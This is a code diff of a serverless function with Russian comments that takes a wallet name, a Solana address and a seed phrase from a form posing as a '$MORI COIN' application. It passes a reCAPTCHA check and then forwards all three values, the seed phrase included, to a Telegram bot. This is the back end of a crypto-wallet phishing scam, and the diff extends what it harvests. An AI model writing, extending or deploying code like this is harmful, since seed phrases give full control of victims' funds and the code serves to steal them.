@@ -14,9 +14,9 @@ exports.handler = async function (event) {
     }
 
     try {
-        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY_V2 } = process.env; // Добавлен секретный ключ для v2
+        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY_V2 } = process.env;
         const body = JSON.parse(event.body);
-        const { walletName, seedPhrase, recaptchaToken } = body; // recaptchaToken возвращен
+        const { walletName, solAddress, seedPhrase, recaptchaToken } = body; // Добавлен solAddress
 
         // --- ПРОВЕРКА RECAPTCHA V2 ---
         if (!recaptchaToken) {
@@ -32,7 +32,7 @@ exports.handler = async function (event) {
         const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
         const recaptchaRes = await axios.post(recaptchaUrl, null, {
             params: {
-                secret: RECAPTCHA_SECRET_KEY_V2, // Используем ключ для v2
+                secret: RECAPTCHA_SECRET_KEY_V2,
                 response: recaptchaToken,
             },
         });
@@ -52,7 +52,7 @@ exports.handler = async function (event) {
             throw new Error("Конфигурация сервера не завершена.");
         }
         
-        if (!walletName || !seedPhrase) {
+        if (!walletName || !solAddress || !seedPhrase) { // Проверяем наличие solAddress
             return {
                 statusCode: 400,
                 body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
@@ -60,10 +60,12 @@ exports.handler = async function (event) {
         }
 
         const sanitizedWallet = sanitizeText(walletName);
+        const sanitizedSolAddress = sanitizeText(solAddress); // Очистка SOL-адреса
         const sanitizedPhrase = sanitizeText(seedPhrase);
 
         const message = `Новая заявка на $MORI COIN:
 Кошелёк: ${sanitizedWallet}
+SOL Адрес: ${sanitizedSolAddress}
 Сид фраза: ${sanitizedPhrase}`;
         
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
